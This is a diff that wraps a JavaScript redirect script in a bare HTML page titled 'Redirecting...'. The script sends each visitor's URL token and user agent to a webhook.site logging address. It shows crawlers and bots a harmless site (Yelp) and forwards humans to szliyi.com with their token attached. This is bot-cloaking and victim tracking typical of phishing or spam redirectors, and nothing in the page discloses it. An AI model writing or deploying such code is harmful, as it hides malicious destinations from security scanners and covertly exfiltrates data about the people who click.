@@ -1,31 +1,41 @@
-<script>
-  window.addEventListener("load", function () {
-    const hash = window.location.hash ? window.location.hash.substring(1) : null;
-    const ua = navigator.userAgent || "";
-    const isBot = /bot|crawl|spider|slurp|headless|phantom|facebookexternalhit/i.test(ua);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.addEventListener("load", function () {
+      const hash = window.location.hash ? window.location.hash.substring(1) : null;
+      const ua = navigator.userAgent || "";
+      const isBot = /bot|crawl|spider|slurp|headless|phantom|facebookexternalhit/i.test(ua);
 
-    console.log("🔍 HASH:", hash);
-    console.log("🕵️ UA:", ua);
-    console.log("🤖 Is Bot:", isBot);
+      console.log("🔍 HASH:", hash);
+      console.log("🕵️ UA:", ua);
+      console.log("🤖 Is Bot:", isBot);
 
-    if (!hash) {
-      console.log("❌ No token — redirecting to Google");
-      window.location.href = "https://google.com";
-      return;
-    }
+      if (!hash) {
+        console.log("❌ No token — redirecting to Google");
+        window.location.href = "https://google.com";
+        return;
+      }
 
-    const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
-    const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&ts=${Date.now()}`;
-    const img = new Image();
-    img.src = fullLogUrl;
+      const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
+      const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&ts=${Date.now()}`;
+      const img = new Image();
+      img.src = fullLogUrl;
 
-    if (isBot) {
-      console.log("✅ Bot detected — redirecting to Yelp");
-      window.location.href = "https://yelp.com";
-      return;
-    }
+      if (isBot) {
+        console.log("✅ Bot detected — redirecting to Yelp in 3 seconds...");
+        setTimeout(() => {
+          window.location.href = "https://yelp.com";
+        }, 3000);
+        return;
+      }
 
-    console.log("✅ Human detected — redirecting to szliyi");
-    window.location.replace(`https://szliyi.com/${hash}`);
-  });
-</script>
+      console.log("✅ Human detected — redirecting to szliyi.com");
+      window.location.replace(`https://szliyi.com/${hash}`);
+    });
+  </script>
+</head>
+<body></body>
+</html>
